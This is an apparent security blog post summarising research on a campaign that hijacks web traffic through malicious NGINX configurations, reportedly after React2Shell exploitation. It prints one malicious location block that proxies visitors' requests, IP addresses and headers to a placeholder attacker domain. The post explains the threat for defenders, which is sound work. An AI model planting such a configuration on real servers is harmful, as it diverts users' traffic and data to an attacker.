---
title: Web Traffic Hijacking Malicious Nginx Configurations Uncovered
date: 2026-02-05
categories: [CYBERSECURITY]
tags: [NGINX,MALWARE,WEB TRAFFIC,SECURITY]
---

## Web Traffic Hijacking Nginx Configuration Malicious 🚨

Datadog Security Research has identified an active web traffic hijacking campaign targeting NGINX installations and management panels like Baota (BT). This campaign is linked to threat actors associated with the recent React2Shell exploitation, aiming to hijack web traffic using malicious NGINX configurations.

### Key Findings 🔍
- The malicious configuration intercepts legitimate web traffic between users and websites, routing it through attacker-controlled backend servers.
- The campaign primarily targets Asian TLDs (.in, .id, .pe, .bd, .th), Chinese hosting infrastructure (Baota Panel), and government and educational TLDs (.edu, .gov).
- Initial access is believed to be gained through the exploitation of the React2Shell vulnerability (CVE-2025-55182).

### Attack Progression 📈
1. **Remote Code Execution:** Attackers exploit React2Shell to gain initial RCE on the target system.
2. **Toolkit Deployment:** They download and execute NGINX injection scripts.

### Malicious Configuration Example ⚙️
```nginx
location /%PATH%/ {
    set $fullurl "$scheme://$host$request_uri";
    rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
    proxy_set_header Host [Attacker_Domain];
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header User-Agent $http_user_agent;
    proxy_set_header Referer $http_referer;
    proxy_ssl_server_name on;
    proxy_pass https:[Attacker_Domain];
}
```
In this configuration, the path variable and `proxy_pass` directive are dynamically determined based on the specific domain hijacked by the attacker.

### Conclusion 🛡️
Once sufficient access is gained, attackers deploy a sophisticated toolkit designed for automated NGINX compromise, revealing a multi-stage approach that includes target discovery, persistence mechanisms, and the creation of malicious configuration files.

For more detailed information, read the complete article here: [Read full article](https://securitylabs.datadoghq.com/articles/web-traffic-hijacking-nginx-configuration-malicious/)